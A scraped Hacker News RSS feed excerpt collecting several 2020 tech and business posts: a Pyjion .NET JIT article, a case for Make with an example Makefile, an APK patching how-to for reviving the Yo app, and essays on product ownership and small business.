<li>3 builtin languages, C#, F# and VB.NET, each with its own compiler</li>
<li>A standard library</li>
<li>A common intermediate language to abstract the high level languages from the core runtime. This is a standard known as <a href="https://github.com/tonybaloney/ecma-335/tree/master/docs">ECMA 335 CIL</a>.</li>
<li>A common language runtime (CLR) that compiles CIL into native machine code so that it can be executed and packages executables into .exe formats.</li>
</ul>
<p><img alt=".NET architecture" src="https://tonybaloney.github.io/img/posts/Common_Language_Infrastructure.png"></p>
<p>.NET 5 CLR comes bundled with a performant JIT compiler (codenamed RyuJIT) that will compile .NETs CIL into native machine instructions on Intel x86, x86-64, and ARM CPU architectures.</p>
<p>You can write code in a number of languages, like C++, C#, F# and compile those into CIL and then into native machine code (as a binary executable) on macOS, Linux, and Windows. Pretty neat.</p>
<p>But this is a blog about Python. So what does this have to do with Python?</p>
<p>Pyjion is a project to replace the core execution loop of CPython by transpiling CPython bytecode to ECMA CIL and then using the .NET 5 CLR to compile that into machine code. It then executes the machine-code compiled JIT frames at runtime instead of using the native execution loop of CPython.</p>
<h2>Very-quick overview of Python’s compiler</h2>
<p>When CPython compiles Python code, it compiles it into an intermediate format, similar to .NET, called Python bytecode. This bytecode is cached on disk so that when you import a module that hasn’t changed, it doesn’t compile it every time. You can see the bytecode by disassembling any Python function:</p>
<pre><code>&gt;&gt;&gt; import dis
&gt;&gt;&gt; def half(x):
...    return x/2
... 
&gt;&gt;&gt; dis.dis(half)
  2           0 LOAD_FAST                0 (x)
              2 LOAD_CONST               1 (2)
              4 BINARY_TRUE_DIVIDE
              6 RETURN_VALUE
</code></pre>

<p>To execute anything on a CPU, you have to provide the OS with machine-code instructions. This can be accomplished by compiling them up-front using a compiled like the C or C++ compilers. They compile code into executable formats as either shared libraries or standalone executables. <a href="https://tonybaloney.github.io/posts/extending-python-with-assembly.html"><em>See my post on Python/assembly for a bit more info on this topic</em></a>.</p>
<p>CPython converts the bytecode into machine code instructions like looping over them in a precompiled function, called the evaluation loop. This is essentially a big for loop with a switch statement. The compiled version of CPython that you’re running already has the instructions required. This is why CPython’s evaluation loop is an “AOT”, or “Ahead of Time” compiled library:</p>
<p><img alt="diagram 1" src="https://tonybaloney.github.io/img/posts/Slide1.png"></p>
<p><strong>Note: There is a lot more to CPython’s compiler. I’ve written a <a href="https://realpython.com/products/cpython-internals-book/">whole book on the CPython compiler and the internals of CPython</a> if you want to learn more.</strong></p>
<p>There are a few issues with this approach. The biggest is speed. A series of inline machine-code instructions is very performant. CPython has to make judgements at runtime for which code branch to follow every time your function is run. This leads to CPython being 100x slower in “tight-loop” problems where its executing the same thing again and again. The machine-code is compiled ahead of time and it has to loop around to get to the right instructions. Checkout my PyCon talk for a more in-depth explanation:</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/I4nkgJdVZFA" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>The most common way around this performance barrier is to compile Python extensions from C. This produces a custom binary with inline machine-code instructions for the task at hand. This is how most machine-learning and data science libraries like numpy, pandas, SKL are put together. This approach is still AOT compiling the code. It also requires a lot of knowledge of C. This approach has worked really well for the data science community, where algorithms can be performant and leverage low-level platforms <a href="https://numba.pydata.org/numba-doc/latest/cuda/index.html">like GPUs or specialised AI chipsets</a>.</p>
<p>There are a few issues with the AOT extension module approach. One is that it still uses the evaluation loop. C extension modules are a set of functions. Once you call the C-compiled function, its in the performant code, but your Python code that’s calling it still lives inside Python’s loop. If you want to leverage a compiled library and your Python code is doing some heavy number crunching, you end up having to use an API of functions, like numpy, instead of a more fluent Python API:</p>
<pre><code>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; a = np.ones([9, 5, 7, 4])
&gt;&gt;&gt; c = np.ones([9, 5, 4, 3])
&gt;&gt;&gt; np.dot(a, c).shape
(9, 5, 7, 9, 5, 3)
&gt;&gt;&gt; np.matmul(a, c).shape
(9, 5, 7, 3)
</code></pre>

<h2>What Pyjion does to solve this issue</h2>
<p>A few releases of Python ago (CPython specifically, the most commonly used version of Python) in 3.7 a new API was added to be able to swap out “frame execution” with a replacement implementation. This is otherwise known as <a href="https://www.python.org/dev/peps/pep-0523/">PEP 523</a>. PEP 523 also added the capability to store additional attributes in <em>code objects</em> (compiled Python code.</p>
<p>Pyjion does not compile Python code. It compiles Python frames (code objects, like blocks, functions, methods, classes) into machine-code at runtime using a performant JIT:</p>
<p><img alt="diagram 2" src="https://tonybaloney.github.io/img/posts/Slide2.png"></p>
<p>CPython compiles the Python code, so whatever language features and behaviours there are in CPython 3.9, like the walrus operator, <a href="https://www.python.org/dev/peps/pep-0584">the dictionary union operator</a>, will all work exactly the same with this extension enabled. This also means that this extension uses the same standard library as Python 3.9.</p>
<p>Pyjion is a “pip installable” package for standard CPython that JIT compiles all Python code at runtime using the .NET 5 JIT compiler. You can use off-the-shelf CPython 3.9 on macOS, Linux or Windows. After installing this package you just import the module and enable the JIT.</p>
<p>Once a frame has been compiled, the binary code is cached in memory and reused every time the function is called:</p>
<p><img alt="diagram 3" src="https://tonybaloney.github.io/img/posts/Slide3.png"></p>
<h2>Using Pyjion</h2>
<p>To get started, you need to have .NET 5 installed, with Python 3.9 and the Pyjion package (I also recommend using a virtual environment).</p>
<p>After importing pyjion, enable it by calling <code>pyjion.enable()</code> which sets a compilation threshold to 0 (the code only needs to be run once to be compiled by the JIT):</p>
<pre><code>&gt;&gt;&gt; import pyjion
&gt;&gt;&gt; pyjion.enable()
</code></pre>

<p>Any Python code you define or import after enabling pyjion will be JIT compiled. You don’t need to execute functions in any special API, its completely transparent:</p>
<pre><code>&gt;&gt;&gt; def half(x):
...    return x/2
&gt;&gt;&gt; half(2)
1.0
</code></pre>

<p>Pyjion will have compiled the <code>half</code> function into machine code on-the-fly and stored a cached version of that compiled function inside the function object.
You can see some basic stats by running <code>pyjion.info(f)</code>, where <code>f</code> is the function object:</p>
<pre><code>&gt;&gt;&gt; pyjion.info(half)
{'failed': False, 'compiled': True, 'run_count': 1}
</code></pre>

<p>You can see the machine code for the compiled function by disassembling it in the Python REPL.
Pyjion has essentially compiled your small Python function into a small, standalone application.
Install <code>distorm3</code> first to disassemble x86-64 assembly and run <code>pyjion.dis.dis_native(f)</code>:</p>
<pre><code>&gt;&gt;&gt; import pyjion.dis
&gt;&gt;&gt; pyjion.dis.dis_native(half)
00000000: PUSH RBP
00000001: MOV RBP, RSP
00000004: PUSH R14
00000006: PUSH RBX
00000007: MOV RBX, RSI
0000000a: MOV R14, [RDI+0x40]
0000000e: CALL 0x1b34
00000013: CMP DWORD [RAX+0x30], 0x0
00000017: JZ 0x31
00000019: CMP QWORD [RAX+0x40], 0x0
0000001e: JZ 0x31
00000020: MOV RDI, RAX
00000023: MOV RSI, RBX
00000026: XOR EDX, EDX
00000028: POP RBX
00000029: POP R14
...
</code></pre>

<p>The complex logic of converting a portable instruction set into low-level machine instructions is done by .NET’s CLR JIT compiler.</p>
<p>All Python code executed after the JIT is enabled will be compiled into native machine code at runtime and cached on disk. For example, to enable the JIT on a simple <code>app.py</code> for a Flask web app:</p>
<pre><code>import pyjion
pyjion.enable()

from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello, World!'

app.run()
</code></pre>

<p>That’s it.</p>
<h2>Will this be compatible with my existing Python code? What about C Extensions?</h2>
<p>The short answer is- if your existing Python code runs on CPython 3.9 – <strong>yes</strong> it will be compatible. To make sure, Pyjion has been tested against the full CPython “test suite” on all platforms. In fact, it was the first JIT ever to pass the test suite.</p>
<p>Thats because this isn’t a Python runtime, it uses the existing Python compiler to compile your code into Python bytecode (low level instructions).</p>
<p>Pyjion uses the same dynamic module loader as CPython, so if you import a Python extension from your virtual environment, it will work just the same in Pyjion.</p>
<h2>Project History</h2>
<p>Pyjion isn’t new. Brett Cannon and Dino Viehland started the Pyjion project 4 years ago. This was the first JIT to pass the full CPython test suite.
There were some limitations to the original proof-of-concept:</p>
<ul>
<li>Written against an old version of .NET Core</li>
<li>Required custom patches of .NET and compiling from source</li>
<li>Required custom patches of CPython and compiling from source</li>
<li>Only worked on Windows</li>
<li>It was written for Python 3.6 before PEP 523 was agreed and merged</li>
</ul>
<p>Has much changed since Python 3.6? To the average user, not really. But under the hood, the implementation of a few things has completely changed:</p>
<ul>
<li>Function calls</li>
<li>Iterators</li>
<li>Exception Handling</li>
<li>Dictionary, list and set comprehensions</li>
<li>Generators and coroutines</li>
</ul>
<p>Actually, a <strong>lot</strong> has changed in the last few releases of CPython. The <a href="https://github.com/microsoft/Pyjion/pull/237">patch that I’m talking about</a> to get Pyjion working with the latest version of everything was a big undertaking…</p>
<p><img alt="not-much-has-changed" src="https://tonybaloney.github.io/img/posts-original/not-much-has-changed.png"></p>
<p>The goal with the latest patch was to get the project up to the condition of:</p>
<ul>
<li>Using the release binaries of .NET 5 and CPython 3.9</li>
<li>Making it work across all platforms</li>
<li>Implement the PEP523 interface</li>
<li>Implement all the new features of Python 3.9</li>
<li>Making the package “pip installable” from PyPi</li>
<li>Improving the test coverage</li>
<li>Adding a disassembler (both machine-code and CIL) to aid development</li>
</ul>
<h2>Is this faster?</h2>
<p>The short answer a little, but not by much (yet).</p>
<p>JIT …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tonybaloney.github.io/posts/running-python-on-dotnet-5-with-pyjion.html">https://tonybaloney.github.io/posts/running-python-on-dotnet-5-with-pyjion.html</a></em></p>]]>
            </description>
            <link>https://tonybaloney.github.io/posts/running-python-on-dotnet-5-with-pyjion.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25064143</guid>
            <pubDate>Wed, 11 Nov 2020 23:11:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[All known, public ACME servers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25063759">thread link</a>) | @riffic
<br/>
November 11, 2020 | https://docs.https.dev/list-of-acme-servers | <a href="https://web.archive.org/web/*/https://docs.https.dev/list-of-acme-servers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><div><p><span>All known, public ACME servers</span></p></div></div></div></div><div><div data-editioncontainer="true"><div data-slate-editor="true" data-key="3b72c1eb76324fcea60749a49d24393c" autocorrect="on" spellcheck="true" data-gramm="false"><p data-key="a7423c5bafea4eb385c7e07d0826ea40"><span><span data-key="2d2fcbc1b03349468d8ed1673c1750e0"><span data-offset-key="2d2fcbc1b03349468d8ed1673c1750e0:0">All endpoints on this list are compliant with RFC 8555.</span></span></span></p><p data-key="43f617bd0df447d6b37ca47b12b0a2b7"><span><span data-key="48583dcada4646548bc5caa4bbdd9b9b"><span data-offset-key="48583dcada4646548bc5caa4bbdd9b9b:0">Please note that different CAs have varying legal terms, pricing, and some difference in their ACME issuance policies. Consult each CA's documentation for more information.</span></span></span></p><ul data-key="7ae709311946447e951eaf568ddef55a"><li></li><li></li><li></li><li></li><li></li></ul></div></div></div></div></div></div>]]>
            </description>
            <link>https://docs.https.dev/list-of-acme-servers</link>
            <guid isPermaLink="false">hacker-news-small-sites-25063759</guid>
            <pubDate>Wed, 11 Nov 2020 22:27:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Give back to free and open source software]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25063734">thread link</a>) | @jlelse
<br/>
November 11, 2020 | https://jlelse.blog/links/2020/11/foss-donations | <a href="https://web.archive.org/web/*/https://jlelse.blog/links/2020/11/foss-donations">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://oscarbenedito.com/blog/2020/11/give-back-to-foss/" target="_blank" rel="noopener">Oscar Benedito writes</a> about how to give back to free and open source software (FOSS).</p><p>There are at least four options, according to him:</p><ol><li>Donate</li><li>Report bugs</li><li>Translate</li><li>Send patches</li></ol><p>Of course you don’t have to, but if you can and want to, do so!</p><p>This post just made me donate to two projects: <a href="https://newpipe.schabi.org/" target="_blank" rel="noopener">NewPipe</a> (<a href="https://liberapay.com/TeamNewPipe" target="_blank" rel="noopener">donation link</a>), which is an alternative YouTube player for Android I use as replacement for the official YouTube app, and <a href="https://nitter.net/" target="_blank" rel="noopener">Nitter</a> (<a href="https://liberapay.com/zedeus" target="_blank" rel="noopener">donation link</a>), an alternative Twitter frontend on the web. I donated to both projects via <a href="https://liberapay.com/" target="_blank" rel="noopener">Liberapay</a>, a project that I might also donate to. Liberapay is a platform that is specifically designed to support FOSS projects and is financed exclusively by donations.</p><p>However, another way I see supporting a FOSS project is to spread the word about it through word of mouth or, in my case, blogging about it. Maybe someone else will enjoy a project too and support it even more than I can.</p><p><a href="https://oscarbenedito.com/blog/2020/11/give-back-to-foss/" target="_blank" rel="noopener">https://oscarbenedito.com/blog/2020/11/give-back-to-foss/</a></p></div></div>]]>
            </description>
            <link>https://jlelse.blog/links/2020/11/foss-donations</link>
            <guid isPermaLink="false">hacker-news-small-sites-25063734</guid>
            <pubDate>Wed, 11 Nov 2020 22:25:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Deploy professionally built algo-traders in 5 mins with 0 code]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25063678">thread link</a>) | @tjs8rj
<br/>
November 11, 2020 | https://areyouinterested.co/site/quantbase/ | <a href="https://web.archive.org/web/*/https://areyouinterested.co/site/quantbase/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="hero-1"><p id="subheading">Deploy algorithms from top hedge funds,<br> rank and use 100s of users’ algorithms,<br> or create new algo-traders effortlessly</p>

              <div id="interested">
                <h3>Are you interested?</h3>
                <div id="buttons">
                  <p><a href="https://areyouinterested.co/site/quantbase/yes" id="yes">Yes</a>
                  <a href="https://areyouinterested.co/site/quantbase/no" id="no">No</a>
                </p></div>
              </div>

            </div></div>]]>
            </description>
            <link>https://areyouinterested.co/site/quantbase/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25063678</guid>
            <pubDate>Wed, 11 Nov 2020 22:18:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Case for Make: The New Old Build Tool]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25063540">thread link</a>) | @chill1
<br/>
November 11, 2020 | https://degreesofzero.com/article/the-case-for-make-the-new-old-build-tool.html | <a href="https://web.archive.org/web/*/https://degreesofzero.com/article/the-case-for-make-the-new-old-build-tool.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>If you've never had to migrate a project from one build system to another, I envy you. How sweet it is to have not experienced the psychological torture that is unwinding years of hacks and work-arounds layered on-top of one another during a legacy project's lifetime. But nothing lasts forever. You too will know this feeling eventually. Or maybe not. Let's talk about how you can avoid this fate by using a new (very old) build system called <a href="https://www.gnu.org/software/make/">Make</a>.</p>
<h2 id="the-case-against-modern-build-systems">The Case Against Modern Build Systems</h2>
<p>Modern build systems use an insane number of dependencies:</p>
<ul>
<li><a href="https://npm.anvaka.com/#/view/2d/gulp">gulp</a> - 296 nodes, 513 links</li>
<li><a href="https://npm.anvaka.com/#/view/2d/grunt">grunt</a> - 170 nodes, 277 links</li>
<li><a href="https://npm.anvaka.com/#/view/2d/webpack">webpack</a> - 82 nodes, 119 links</li>
</ul>
<div>
  <div>
    <p><img width="1920" height="1080" src="https://degreesofzero.com/article/the-case-for-make-the-new-old-build-tool/images/dep-tree-gulp.jpg" alt="" title="gulp's dependency graph">
      <img width="1920" height="1080" src="https://degreesofzero.com/article/the-case-for-make-the-new-old-build-tool/images/dep-tree-grunt.jpg" alt="" title="grunt's dependency graph">
      <img width="1920" height="1080" src="https://degreesofzero.com/article/the-case-for-make-the-new-old-build-tool/images/dep-tree-webpack.jpg" alt="" title="webpack's dependency graph">
    </p>
    <p><b>gulp</b> (left), <b>grunt</b> (center), <b>webpack</b> (right)</p>
  </div>
</div>

<p>Of the build systems mentioned above, only one is still under active development. That one is <a href="https://webpack.js.org/">webpack</a>, which is used by the popular web framework <a href="https://reactjs.org/">React</a>. If you are unfamiliar with webpack, good for you. It is a gigantic piece of software that does too many things. From my experience, webpack can be nice to bootstrap a simple proof-of-concept project, but eventually you will hit a wall where you need to do some extremely hacky work-arounds to do something that it doesn't easily support.</p>
<p>Why am I talking about dependencies? Well...</p>
<blockquote>
<p>Earlier this week, many npm users suffered a disruption when a package that many projects depend on — directly or indirectly — was unpublished by its author, as part of a dispute over a package name. The event generated a lot of attention and raised many concerns, because of the scale of disruption, the circumstances that led to this dispute, and the actions npm, Inc. took in response.</p>
</blockquote>
<p>This was the <a href="https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm">"leftpad incident"</a> as it has become to be known.</p>
<p>The package author mentioned in the above quote unpublished more than 250 packages from the npm registry in a very short time. This broke thousands of projects and caused a lot of headaches for maintainers and developers throughout the ecosystem.</p>
<p>This alone should be a strong reason to try to limit your project's exposure to huge dependency graphs.</p>
<p>But in case you are not yet convinced, here are a few more reasons:</p>
<ul>
<li>Less time wasted fixing the build process after upgrading dependencies.</li>
<li>Reduce the attack surface that could allow malicious/rogue dependencies to:<ul>
<li><a href="https://www.veracode.com/blog/research/abusing-npm-libraries-data-exfiltration">Exfiltrate sensitive data</a> such as keys or secrets via the file system or environment variables.</li>
<li>Utilize (abuse) system resources to mine cryptocurrencies.</li>
<li>Use system's network capacity to spam, run proxy servers, or DOS attack other services.</li>
</ul>
</li>
</ul>
<h2 id="the-case-for-make">The Case For Make</h2>
<p>Make. Is. Everywhere. You very likely already have it installed on your system. Or if not, it will be available to install via your system's package repository.</p>
<p>Make is ideal for running builds or as a general purpose task runner. It allows you to easily incorporate bash commands and tools that already exist on your system. All of these tools have been around forever, are well tested, and they are stable.</p>
<h3 id="make-in-practice">Make In Practice</h3>
<p>Here is an example Makefile that includes comments that explain each section:</p>
<pre><code>







BUILD<span>=</span>build
ALL_CSS<span>=</span><span>$</span><span>(</span>BUILD<span>)</span>/css/all.css
SRC<span>=</span>src















<span>.PHONY</span><span>:</span> build\
clean\
fonts\
images

<span>build</span><span>:</span> fonts images <span>$</span><span>(</span>ALL_CSS<span>)</span>

<span>clean</span><span>:</span>
  
  rm -rf <span>$</span><span>(</span>BUILD<span>)</span>/*


CSS_FILES<span>=</span><span>$</span><span>(</span>SRC<span>)</span>/css/fonts.css\
<span>$</span><span>(</span>SRC<span>)</span>/css/reset.css\
<span>$</span><span>(</span>SRC<span>)</span>/css/styles.css\
<span>$</span><span>(</span>SRC<span>)</span>/css/responsive.css

<span><span>$</span>(ALL_CSS)</span><span>:</span> <span>$</span><span>(</span>SRC<span>)</span>/css/
  mkdir -p <span>$$</span><span>(</span>dirname <span>$@</span><span>)</span>
  rm -f <span>$</span><span>(</span>ALL_CSS<span>)</span>
  for file in <span>$</span><span>(</span>CSS_FILES<span>)</span><span>;</span> do \
    echo <span>"/* $$file */"</span> &gt;&gt; <span>$</span><span>(</span>ALL_CSS<span>)</span><span>;</span> \
    cat <span>$$file</span> &gt;&gt; <span>$</span><span>(</span>ALL_CSS<span>)</span><span>;</span> \
    echo <span>""</span> &gt;&gt; <span>$</span><span>(</span>ALL_CSS<span>)</span><span>;</span> \
  done

<span>fonts</span><span>:</span>
  
  mkdir -p <span>$</span><span>(</span>BUILD<span>)</span>/fonts/OpenSans
  cp -r node_modules/open-sans-fontface/fonts/**/* <span>$</span><span>(</span>BUILD<span>)</span>/fonts/OpenSans/

<span>images</span><span>:</span>
  
  mkdir -p <span>$</span><span>(</span>BUILD<span>)</span>/images/
  cp -r <span>$</span><span>(</span>SRC<span>)</span>/* <span>$</span><span>(</span>BUILD<span>)</span>/images/</code></pre>
<p>It is basically bash with the added syntax for build targets. Make will only build files whose inputs have been modified. So in this example, if you change one of your CSS source files then the all.css build file will be recompiled.</p>
<p>The example above is quite simple. It only includes copying and concatenating files. You can add dependencies as you need them to perform minification of JavaScript files, syntax highlighting, templating, and more.</p>
<p>For more advanced build processes, it's a good idea to execute bash (or node.js) scripts from within the Makefile. This gives you the structure and functionality of Make with the flexibility of whichever scripting language you prefer.</p>
<p>During the last few years, I've migrated several projects to Make and it has turned out to be a great move for the long-term maintainability of those projects. You can have a look at some of these projects for more complex, real-world examples using Make:</p>
<ul>
<li><a href="https://github.com/samotari/pay-no-way">PayNoWay</a> - Bitcoin double-spending app for Android</li>
<li><a href="https://github.com/samotari/bleskomat">Bleskomat</a> - Lightning Network ATM hardware + software project</li>
</ul>
<p>Choose Make as your next project's build system. Your future self will thank you!</p>

		</div></div>]]>
            </description>
            <link>https://degreesofzero.com/article/the-case-for-make-the-new-old-build-tool.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25063540</guid>
            <pubDate>Wed, 11 Nov 2020 22:01:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reviving Yo: How to Patch an APK]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25063163">thread link</a>) | @wesleyac
<br/>
November 11, 2020 | https://blog.wesleyac.com/posts/patching-apks | <a href="https://web.archive.org/web/*/https://blog.wesleyac.com/posts/patching-apks">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>I got talking to a friend the other day about <a href="https://en.wikipedia.org/wiki/Yo_(app)">Yo</a>, the app where you can send your friends the word "Yo." It's nominally still around, run off donations, but the SSL certificate for the API server has been expired for a little while, so the app doesn't work anymore. Not to worry, though, that's something we can fix by patching the APK pretty quickly.</p>

<p>First, <a href="https://play.google.com/store/apps/details?id=com.justyo">download Yo on the Play Store</a>. Then, download <a href="https://play.google.com/store/apps/details?id=com.ext.ui">APK Extractor</a>, and use it to download the APK off your phone (you'll need to get it onto your computer somehow, I emailed it to myself). You should have a file called <code>Yo_base.apk</code>.</p>

<p>Next, install <a href="https://ibotpeaches.github.io/Apktool/"><code>apktool</code></a>, and use it to decompile the APK:</p>
<div><pre><code data-lang="">apktool if Yo_base.apk
apktool d Yo_base.apk
</code></pre></div>
<p>This should make a directory called <code>Yo_base</code>, which you can edit however you want. I changed <code>https://newapi.justyo.co</code> to <code>http://newapi.justyo.co</code> in <code>res/values/strings.xml</code>, but you could also make other changes as well. Once you've done that, recompile the APK like so:</p>

<p>Now there should be a <code>Yo_base/dist/Yo_base.apk</code> file, but it's not signed, so we can't use it. Signing it isn't too tricky though. Using the <code>keytool</code> and <code>jarsigner</code> tools that come with the JDK:</p>
<div><pre><code data-lang="">keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore Yo_base/dist/Yo_base.apk alias_name
</code></pre></div>
<p>It'll ask you to make a password and enter your name and things, I don't think it really matters what you choose. Once you've done all that, you can move the <code>Yo_base/dist/Yo_base.apk</code> file to your phone, click through all the fuss that Android makes about running a unsigned APK, and start Yoing away! This also works for other apps just as well :)</p>

          </div></div>]]>
            </description>
            <link>https://blog.wesleyac.com/posts/patching-apks</link>
            <guid isPermaLink="false">hacker-news-small-sites-25063163</guid>
            <pubDate>Wed, 11 Nov 2020 21:24:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to master being high on ownership-a guide for Product Managers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25062859">thread link</a>) | @justanotherpm
<br/>
November 11, 2020 | https://blog.justanotherpm.com/how-to-master-being-high-on-ownership/ | <a href="https://web.archive.org/web/*/https://blog.justanotherpm.com/how-to-master-being-high-on-ownership/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
<div>
    <main>
            <article>
    
    <div>
            <p>This post is a follow up to the last one: <a href="https://blog.justanotherpm.com/why-is-ownership-such-an-important-quality-for-great-product-managers-5-reasons/">Why is Ownership Important for Product Managers</a>.</p><p>Today, we talk about different ways to build high ownership as a product manager, especially a new product manager.</p><ol><li><strong>Be the most knowledgable person on the team.</strong> Its easier said than done. That is why you should make learning a priority when you join a new team or organization. Learn about your product, business, customers and industry. Read internal and external documents, get access to the relevant data / dashboards, and talk to those who have the most information. Every time I join a new team, I regularly meet with senior leaders from different teams to get as much knowledge as possible.</li><li><strong>Understand your team's and the company's goals</strong>. The direct manager and other PMs on the team are usually the best people to share the most relevant context. Talking to the engineers will &nbsp;always bring a different perspective. In these discussions, your main aim should be to uncover "what" is the goal and "why" is it the focus at that time.</li><li><strong>Strong relationships with stakeholders.</strong> If you've been reading my posts, you know that I mention <em>building relationships</em> in almost all my guides. And that is because building relationships is truly one of the most important things to do. I always actively work on building relationships from day one. It helps me gain more knowledge, influence the same stakeholders (if and when required), and to remove blockers in critical situations. Basically, these relations make execution seamless.</li><li><strong>Visibility, transparency, openness.</strong> Create processes that encourage transparency and openness to share feedback. Create visibility for others in your progress. It is a signal of strength. It conveys a simple yet powerful message: "you are doing your best. Despite that, things will go wrong. And when that happens, you are open to feedback and to learn from others' experience"</li><li><strong>Execution. Get shit done.</strong> There is nothing that speaks louder of a PM's ownership than her ability to <em>ship</em> products. Executing projects and tasks is the most tangible signal that non-technical stakeholders use to assess you. Exceptions do exist.</li></ol><p>High ownership is sometimes confused with owning a large set of projects or an extended portfolio of products. But high ownership is more about identifying and working only on critical projects, and <strong>always delivering</strong> on them.</p><hr><p>Get bite-sized summaries of the best product management content in your WhatsApp inbox: <a href="http://bit.ly/wajapm">http://bit.ly/wajapm</a></p>
    </div>
        
</article>                            </main>
</div>
        </div></div>]]>
            </description>
            <link>https://blog.justanotherpm.com/how-to-master-being-high-on-ownership/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25062859</guid>
            <pubDate>Wed, 11 Nov 2020 20:54:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Notes on Owning Your Own Business]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25062764">thread link</a>) | @rossdavidh
<br/>
November 11, 2020 | https://www.rosshartshorn.net/stuffrossthinksabout/small_bus_blog_post/ | <a href="https://web.archive.org/web/*/https://www.rosshartshorn.net/stuffrossthinksabout/small_bus_blog_post/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<p>So, you want to strike out on your own, and start your own business?  Great!  Here are a few things you might want to know about that.  They are based on my own experience as an independent contractor (computer programmer), what I've seen being married to an owner (with a partner) of a small retail shop, and what I've seen and heard talking to multiple small business owners of various kinds in the last twenty years.  Some of them are successful, some of them were not, and some were successful but didn't like it, and stopped.  The recurring thing I've seen (and my own lived experience) is that owning and running your own business is not what most people think it is like, so perhaps this will be useful to you as you set out on a different path.</p>



<h2>Lesson 1: You Still Have A Boss</h2>
<p>The most important thing to know, is that being a business owner is NOT like being an employee, except without the boss.  This is, I think, the number one misconception that most people have.  In fact, not only do you still have a boss, but your boss:</p>
<ul>
<li>gives you no paid vacation</li>
<li>gives you no paid sick leave</li>
<li>docks your pay if you break the rules</li>
<li>...but doesn't tell you what those rules are</li>
<li>doesn't (generally) pay overtime if you work long hours or on weekends</li>
<li>does (usually) dock your pay if you take off early</li>
<li>may occasionally pay bonuses, but won't tell you ahead of time what you have to do to get them</li>
</ul>

<p>Your boss is, of course, the market.  New small business owners (and even old ones, sometimes) think they get to decide when they will work, and therefore that customers will show up when they want them to.  But in practice, customers show up when THEY want to, and you need to be ready for them.  If you are not, generally speaking, they will go elsewhere or just forego spending entirely.  The same logic applies to all of the rest of the items in the list above.  The market does all of this, and it is up to you to figure it out, because it won't tell you ahead of time.</p>

<p>Which means really, you have to figure out the rules, and impose them on yourself.  So, when owning your own business, it is not as if you no longer have a boss who makes you do stuff you don't want to do.  It's more like, you also have to be that boss, forcing yourself to do things you don't feel like doing, because there isn't anyone else there to tell you to do it.  That's what "being your own boss" really means; it's not the same as not having a boss.  If you aren't able to make yourself do things when they need doing, even though you don't feel like it right then, then being your own boss may not be for you.</p>

<h2>Lesson 2: The Loop</h2>
<p>There is a process, which you need to know about and think about, as you run a small business.  It is a loop, which can be divided into four parts:</p>
<ol>
<li>Try something (typically involves spending $$ and/or time)</li>
<li>Get results (typically involves receiving $$ or saving time)</li>
<li>Observe that result (notice what just happened)</li>
<li>Plan your next thing to try</li>
</ol>

<img src="https://www.rosshartshorn.net/stuffrossthinksabout/small_bus_blog_post/loop.png">

<p>It may seem so simple and straightforward, that there's no point in stating it.  But, most business failures can be traced ultimately to one of the following breaks in the loop:</p>
<ul>
<li>Not keeping enough data about what happened (failure in the "observe" step, above)</li>
<li>Not taking time to plan what to do (failure in the "plan" step)</li>
<li>Not actually doing what was planned (failure in the "try" step)</li>
</ul>

<p>Let's look at each of these failures in more detail.</p>
<h3>Failure to Observe</h3>

<img src="https://www.rosshartshorn.net/stuffrossthinksabout/small_bus_blog_post/loop_without_observe.png">

<p>Part of this, is the common conception that keeping a lot of data about what happened is a drag, and only corporate losers do that sort of thing and starting your own business is all about getting away from that.  Part of it is a failure to understand (per Lesson 1: You Still Have A Boss) that having your own business doesn't mean you get to do whatever you want.  One example I've often seen, is in the decision of what hours a day, and what days of the week, to be open.</p>

